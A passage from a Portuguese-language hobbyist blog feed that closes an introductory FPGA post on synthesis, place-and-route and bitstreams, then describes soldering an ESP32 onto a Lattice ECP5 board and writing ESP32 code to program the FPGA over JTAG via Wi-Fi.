  <span class="k">signal</span> <span class="n">count</span> <span class="p">:</span><span class="kt">std_logic_vector</span> <span class="p">(</span><span class="mi">7</span> <span class="k">downto</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">begin</span>
  <span class="k">process</span> <span class="p">(</span><span class="n">clk</span><span class="p">,</span> <span class="n">reset</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">reset</span> <span class="o">=</span> <span class="sc">'1'</span><span class="p">)</span> <span class="k">then</span>
      <span class="n">count</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="k">others</span><span class="o">=&gt;</span><span class="sc">'0'</span><span class="p">);</span>
    <span class="k">elsif</span> <span class="p">(</span><span class="n">rising_edge</span><span class="p">(</span><span class="n">clk</span><span class="p">))</span> <span class="k">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">enable</span> <span class="o">=</span> <span class="sc">'1'</span><span class="p">)</span> <span class="k">then</span>
        <span class="n">count</span> <span class="o">&lt;=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">end</span> <span class="k">if</span><span class="p">;</span>
    <span class="k">end</span> <span class="k">if</span><span class="p">;</span>
  <span class="k">end</span> <span class="k">process</span><span class="p">;</span>
  <span class="n">cout</span> <span class="o">&lt;=</span> <span class="n">count</span><span class="p">;</span>
<span class="k">end</span> <span class="k">architecture</span><span class="p">;</span>
</code></pre></div></div>

<p>Existe outro processo de gera√ß√£o que usam linguagens de mais alto n√≠vel (por exemplo C++ ou Python), este processo se chama High Level Synthesis (S√≠ntese de Alto N√≠vel), onde o c√≥digo do FPGA √© construido programaticamente em uma linguagem de mais alto n√≠vel e no fim √© gerado um c√≥digo Verilog / VHDL para sintetiza√ß√£o habitual. Alguns dos processos geram diretamente a netlist, por√©m muitos softwares de empresas de FPGA usam padr√µes pr√≥prios de netlist o que pode tornar um problema o suporte.</p>

<h1 id="processo-de-compila√ß√£o-sintentiza√ß√£o">Processo de ‚Äúcompila√ß√£o‚Äù (sintentiza√ß√£o)</h1>

<p>No processo de compila√ß√£o, ou melhor dizendo, sintetiza√ß√£o (que √© o termo adequado pra esse processo) um c√≥digo escrito em HDL se torna uma netlist que ser√° usada para constru√ß√£o do que ser√° o c√≥digo que ficar√° na mem√≥ria do FPGA. Neste processo as entradas e sa√≠das da netlist tem nomes simb√≥licos que apontam para alguma entrada/sa√≠da do chip. A netlist √© agn√≥stica a esses nomes e eles s√≥ representaram algo significativo para os processos finais da s√≠ntese.</p>

<p>Neste passo s√£o feitas v√°rias otimiza√ß√µes do circuito l√≥gico para que haja o m√≠nimo poss√≠vel de n√≥s na netlist. Algumas dessas otimiza√ß√µes podem ser feitas assumindo algum FPGA especifico (pelo tamanho de sua LUT). Ap√≥s a netlist pronta, as ferramentas dever√£o ‚Äúachar um jeito de encaixar‚Äù o netlist no FPGA alvo. Este passo √© chamado Place &amp; Route (Colocar e Rotear)</p>

<h1 id="place--route">Place &amp; Route</h1>

<p>O processo de place &amp; route √© muito similar a quando um engenheiro desenha uma placa de circuito impresso. Voc√™ coloca os componentes na placa e liga os fios entre eles. Dependendo do circuito isto pode ser f√°cil ou dif√≠cil. Imagine que quanto mais espa√ßo da placa seus componentes ocupar, mais dif√≠cil √© de achar um caminho para todas suas trilhas. O mesmo ocorre com o FPGA.</p>

<p>Este passo √© <strong>sempre</strong> especifico do FPGA de destino, onde par√¢metro como linhas globais de clock, tamanho de LUT e posi√ß√£o de LUT s√£o levadas em conta. Al√©m disso, algumas ferramentas permitem colocar restri√ß√µes nos par√¢metro de delay, clock m√≠nimo e tens√£o el√©trica para as rotas. Com todas essas informa√ß√µes, o programa de Place &amp; Route ir√° tentar achar uma configura√ß√£o v√°lida para aquele FPGA.</p>

<p>Dependendo da complexidade do projeto, o tempo pode ser desde alguns segundos at√© alguns dias. Al√©m disso pode tamb√©m n√£o ser poss√≠vel rotear o seu c√≥digo no FPGA destino, mesmo que este n√£o ocupe o FPGA inteiro!</p>

<p>Ap√≥s o processo estar completo, a netlist ser√° incrementada com a posi√ß√£o <strong>f√≠sica</strong> dos n√≥s dentro do FPGA, por exemplo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Antes do Place &amp; Route
LUT4(0,1,0,1) -&gt; LUT4(1,1,0,0)
// Depois do Place &amp; Route
LUT4_0.0(0,1,0,1) -&gt; LUT4_1.1(1,1,0,0) // one 0.0 e 1.1 s√£o as coordenadas dentro do chip
</code></pre></div></div>

<p>Ap√≥s isso seu programa est√° completo, e o √∫nico passo restante √© gerar a sequ√™ncia de bits que ir√£o programar o FPGA para esta configura√ß√£o!</p>

<h1 id="gera√ß√£o-de-bitstream">Gera√ß√£o de Bitstream</h1>

<p>A ultima etapa do processo √© a gera√ß√£o do bitstream. Este gerador recebe como entrada a netlist complementada com as posi√ß√µes f√≠sicas das c√©lulas do FPGA e como elas se interligam e converte para uma sequ√™ncia de bits propriet√°ria do FPGA. Cada marca e modelo de FPGA tem uma sequ√™ncia especifica para programa√ß√£o e sua programa√ß√£o tamb√©m pode variar do meio de origem.</p>

<p>Por exemplo, um FPGA pode ser programado via:</p>

<ul>
  <li>‚ÄúPorta Serial‚Äù (Na verdade pino de programa√ß√£o serial)</li>
  <li>JTAG</li>
  <li>Mem√≥ria Flash SPI</li>
</ul>

<h1 id="next-steps">Next steps‚Ä¶</h1>

<p>Todos estes processos v√£o ficar mais claros nos pr√≥ximos artigos! Esta √© a primeira parte de uma s√©rie de posts sobre Verilog e programa√ß√£o para FPGA. Farei assim que poss√≠vel o pr√≥ximo post :D</p>

<p>Espero que tenham gostado!</p>]]></content><author><name>Lucas Teske</name></author><category term="Portugues" /><category term="Hacking" /><category term="FPGA" /><category term="Hardware" /><category term="Eletr√¥nica" /><category term="Verilog" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="Hardware" /><category term="Eletr√¥nica" /><category term="Verilog" /><summary type="html"><![CDATA[Esta √© a primeira parte do guia de programa√ß√£o para FPGAs! Este guia ir√° virar eventualmente um verilog4noobs para qualquer pessoa que quiser iniciar na √°rea de programa√ß√£o de hardware possa ter um jeito f√°cil de conseguir! Iremos come√ßar a explicar o que √© um FPGA e como ele funciona.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/FPGA.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/FPGA.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hackeando um ESP32 num FPGA</title><link href="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board" rel="alternate" type="text/html" title="Hackeando um ESP32 num FPGA" /><published>2020-06-14T19:17:00+00:00</published><updated>2020-06-14T19:17:00+00:00</updated><id>https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board</id><content type="html" xml:base="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board"><![CDATA[<h1 id="hackeando-um-esp32-num-fpga">Hackeando um ESP32 num FPGA</h1>

<p>No ano passado eu vi um cara russo que viu que essa placa barata (US$15) tinha um FPGA da Lattice ECP5, o qual √© compat√≠vel com as toolchains opensource para s√≠ntese. Ele estava rodando um RISC-V dentro e enviando a sa√≠da serial pela rede usando uma das portas de rede. Eu queria conseguir uma e come√ßar a brincar. Essas placas s√£o relativamente baratas (mais ou menos US$15) e tem um FPGA da Lattice ( LFE5U-25F-6BG381C ), 4MB DRAM, duas portas gigabit e v√°rios level shifters. Isso √© bom por que:</p>

<ol>
  <li>√â uma placa barata pelas especifica√ß√µes</li>
  <li>Voc√™ pode usar uma toolchain opensource</li>
  <li>Tem MUITOS level-shifter para 5V e eles s√£o bi-direcionais.</li>
</ol>

<p>Eu decidi tentar comprar uma do Aliexpress, mas por causa da pandemia do COVID-19, o pacote est√° super atrasado (ele ainda n√£o chegou, mesmo 3 meses depois de ter pedido). Por sorte eu achei no Mercado Livre para vender por um pre√ßo razo√°vel (R$220).</p>

<p>Quando chegou, eu tentei rodar o cl√°ssico Hello World para Hardware: O Led Blink. Para isso eu usei este projeto para testar: <a href="https://github.com/antonblanchard/ghdl-yosys-blink">https://github.com/antonblanchard/ghdl-yosys-blink</a></p>

<p>Eu fiz um fork e adicionei as configura√ß√µes da placa e tamb√©m a configura√ß√£o para usar um adaptador FR232R no modo bitbang com o OpenOCD (por que era o √∫nico m√©todo poss√≠vel de JTAG dispon√≠vel no momento). <a href="https://github.com/racerxdl/ghdl-yosys-blink">https://github.com/racerxdl/ghdl-yosys-blink</a></p>

<p>Eu n√£o precisei fazer engenharia reversa na placa pois j√° tinham feito: <a href="https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md">https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md</a></p>

<p>Como d√° pra ver, os headers JTAG s√£o de f√°cil acesso e todos os pinos est√£o mapeados. Excelente!</p>

<p>Depois de alguns minutos brincando com o ghdl-yosis-blink eu consegui fazer funcionar na minha placa. Por√©m ele ainda estava rodando na RAM do FPGA e eu queria gravar na mem√≥ria flash. Ent√£o eu comecei a procurar pela internet alguma ferramente que conseguisse converter o bitstream para programar a mem√≥ria flash. Depois de testar muitas ferramentas, eu achei uma simples que faz o trabalho: <a href="https://github.com/f32c/tools/tree/master/ujprog">https://github.com/f32c/tools/tree/master/ujprog</a></p>

<p>S√≥ era nescess√°rio rodar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ujprog <span class="nt">-d</span> <span class="nt">-j</span> flash <span class="nt">-s</span> vhdl_blink-flash.svf vhdl_blink.bit
</code></pre></div></div>

<p>E o arquivo gerado vhdl_blink-flash.svf estava persistindo o bitstream na memoria flash.</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">After few days I managed to write thr SPI Flash using FT232H. Full <a href="https://twitter.com/hashtag/opensource?src=hash&amp;ref_src=twsrc%5Etfw">#opensource</a> stuff to program that board. Also only US$15. <a href="https://t.co/RujsOGwH1D">pic.twitter.com/RujsOGwH1D</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1268616857583419393?ref_src=twsrc%5Etfw">June 4, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Agora que tudo estava funcionando, eu decidi ir para o hack maior: Eu queria um ESP32 ligado na placa e gravar o FPGA via rede. E tamb√©m seria legal se eu conseguisse redirecionar uma porta serial para rede (bom para depurar).</p>

<p>A primeira coisa que fiz foi escolher um par de GPIO para ser o TX/RX da porta serial. O ESP32 tem tr√™s portas seriais, por√©m na minha placa apenas dois s√£o expostos (Serial 0 e 2). A porta serial 0 est√° ligada ao conversor USB-Serial, ent√£o eu decidi usar a porta Serial 2 para comunicar com FPGA. Ap√≥s olhar a pinagem da placa FPGA, eu vi que a maioria dos pinos dos level-shifters s√£o comuns (as linhas de endere√ßo s√£o respons√°veis pela metade dos pinos) e os level-shifters pr√≥ximos da borda inferior da placa eram da linha de endere√ßo. Depois de procurar um pouco, eu decidi remover o conector J4 da placa e o level-shifter U23 (o ESP32 √© 3.3V, lembre-se disso!).</p>

<p><img src="/assets/posts/medium/0_wK9QPXyVChE4n8py.jpeg" alt="U23 e J4 removidos" /><em>U23 e J4 removidos</em></p>

<p>Eu tamb√©m decidi remover o J3 para facilitar a solda dos fios de bypass no conector. Ent√£o eu soldei todos fios para fazer o conector ser 3.3V ao inv√©s de 5V.</p>

<p><img src="/assets/posts/medium/1_tT_gWmR6KPWXKKoewW-KDQ.png" alt="Fios soldados no U23" /><em>Fios soldados no U23</em></p>

<p>Os resistores de 33 Ohm s√£o bons, pois eles evitam curto-circuitos caso os pinos associados a porta serial estejam errados. Ent√£o decidi deixar eles como est√£o. Ap√≥s checar que todos os pinos estavam ok e n√£o estavam em curto, eu decidi usar cola quente para prender eles:</p>

<p><img src="/assets/posts/medium/1_53DN-rC8MrNRfFdVmzN-Uw.png" alt="Peda√ßos de cola quente" /><em>Peda√ßos de cola quente</em></p>

<p>Eu sempre preferi usar um soprador t√©rmico a 200¬∫C ao inv√©s da pistola de cola quente. Isso tamb√©m evita que eu super-aque√ßa a placa e os fios saiam.</p>

<p><img src="/assets/posts/medium/1_7O77I22KdFxtNz4-G2cSeA.png" alt="Soprador t√©rmico e cola quente" /><em>Soprador t√©rmico e cola quente</em></p>

<p>Depois de esfriar os resultados ficaram bons!</p>

<p><img src="/assets/posts/medium/1_sCDf7DO_2mY2FoOTLN357Q.png" alt="Cola quente e os fios de bypass" /><em>Cola quente e os fios de bypass</em></p>

<p>Ent√£o comecei a trabalhar na parte de tr√°s da placa soldando o pair VCC/GND e o par TX/RX. Por sorte o conector de energia nessa placa aceita de 3.6V at√© 6V ent√£o eu posso usar o pino VIN do ESP32 (que est√° conectado aos +5V da porta USB) para alimentar a placa. O conector de energia tamb√©m est√° perto do J4 que removemos.</p>

<p><img src="/assets/posts/medium/1_sADN_JL_MLf9TP5r7FVymQ.png" alt="Conector de energia e porta serial" /><em>Conector de energia e porta serial</em></p>

<p>Ent√£o com uma fita dupla-face, prendi o ESP32 na placa e soldei os fios nos pinos certos.</p>

<p><img src="/assets/posts/medium/1_86Ir5XIqvHCLbMsbWxs5MA.png" alt="ESP32 preso com fita dupla-face e os fios soldados" /><em>ESP32 preso com fita dupla-face e os fios soldados</em></p>

<p>Agora eu s√≥ precisava escolher os pinos para o JTAG e estaria pronto para o c√≥digo! Depois de procurar quais pinos ‚Äúseguros‚Äù eu poderia usar no ESP32, eu escolhi estes pinos:</p>

<ul>
  <li>TDI =&gt; D33</li>
  <li>TDO =&gt; D32</li>
  <li>TCK =&gt; D27</li>
  <li>TMS =&gt; D26</li>
</ul>

<p>E soldei do melhor jeito que pude.</p>

<p><img src="https://cdn-images-1.medium.com/max/2544/0_ERp9fzhTj8EL0i1G" alt="Pinos JTAG soldados" /></p>

<p>Eu tamb√©m tive que soldar o pino GND do ESP32 no pino GND do JTAG (Eu tive um problema com FT232R que foi solucionado soldando o GND)</p>

<p><img src="/assets/posts/medium/1_Ltxy34-3hHoAalgDOHqG7A.png" alt="Alimenta√ß√£o do JTAG" /><em>Alimenta√ß√£o do JTAG</em></p>

<p><img src="/assets/posts/medium/1_Sae7vuGGrvCUuYZdOiGPVA.png" alt="Fio GND soldado" /><em>Fio GND soldado</em></p>

<p>Com todos os fios soldados, eu podia come√ßar a brincar com software!</p>

<p>Primeiro eu tentei usar a fun√ß√£o Remote Bitbang do OpenOCD, o qual conecta em um socket TCP e come√ßa a emitir comandos de bitbang usando um caracter ASCII. Por alguma raz√£o, eu n√£o consegui fazer funcionar. Se voc√™ quiser tentar, esse foi o c√≥digo rodando no ESP32:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;WiFi.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ssid</span>     <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>

<span class="n">WiFiServer</span> <span class="nf">server</span><span class="p">(</span><span class="mi">3335</span><span class="p">);</span>

<span class="cp">#define PIN_SRST 21
#define PIN_TDI 33
#define PIN_TDO 32
#define PIN_TCK 27
#define PIN_TMS 26
#define PIN_LED 2
</span>
<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
    <span class="n">delay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">,</span> <span class="n">INPUT_PULLUP</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="c1">// We start by connecting to a WiFi network</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Connecting to "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">ssid</span><span class="p">);</span>

    <span class="n">WiFi</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">status</span><span class="p">()</span> <span class="o">!=</span> <span class="n">WL_CONNECTED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"WiFi connected."</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"IP address: "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">localIP</span><span class="p">());</span>
    <span class="n">server</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">WiFiClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="n">available</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// if you get a client,</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"New Client."</span><span class="p">);</span>  <span class="c1">// print a message out the serial port</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">connected</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="sc">'B'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'b'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'R'</span><span class="p">:</span>
                      <span class="n">client</span><span class="p">.</span><span class="n">print</span><span class="p">((</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">)</span> <span class="o">==</span> <span class="n">HIGH</span><span class="p">)</span> <span class="o">?</span> <span class="sc">'1'</span> <span class="o">:</span> <span class="sc">'0'</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'Q'</span><span class="p">:</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'r'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'t'</span><span class="p">:</span>
                      <span class="c1">// SRST=0, which confusingly means to *exit* reset (as /RESET and /TRST are active-low)</span>
                      <span class="c1">// We don't have a TRST connection, so 'r' and 't' do the same thing.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, HIGH);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'s'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'u'</span><span class="p">:</span>
                      <span class="c1">// SRST=1 -- enter RESET state</span>
                      <span class="c1">// Likewise for 's' and 'u'.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, LOW);</span>
                      <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Client disconnected"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ontem algu√©m me mandou um link que n√£o era relacionado ao t√≥pico, mas me fez encontrar essa biblioteca:
<a href="http://www.clifford.at/libxsvf/"><strong>Lib(X)SVF - A library for implementing SVF and XSVF JTAG players</strong>
<em>JTAG (IEEE 1149.1, aka ‚ÄúBoundary Scan‚Äù) is a standard IC testing, debugging and programming port. SVF (Serial Vector‚Ä¶</em>www.clifford.at</a></p>

<p>Basicamente ela foi escrita pela mesma pessoa que fez a engenharia reversa do bistream dos FPGA ICE40 (e muitos outros) e era uma biblioteca para reproduzir arquivos SVF e XSVF. Foi bem simples implementar um programador usando o ESP32. Voc√™ apenas precisava implementar algumas fun√ß√µes e tudo funcionava.</p>

<p>Teve muito trabalho para deixar legal de usar, ent√£o eu n√£o vou explicar em detalhes aqui. Por√©m o c√≥digo fonte est√° dispon√≠vel aqui: <a href="https://github.com/racerxdl/esp32-rjtag">https://github.com/racerxdl/esp32-rjtag</a></p>

<p>Voc√™ roda:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload.py /dev/ttyUSB0 file.svf
</code></pre></div></div>

<p>E ele ir√° gravar o FPGA para voc√™. Aqui est√° um video disso funcionando:</p>

<center>
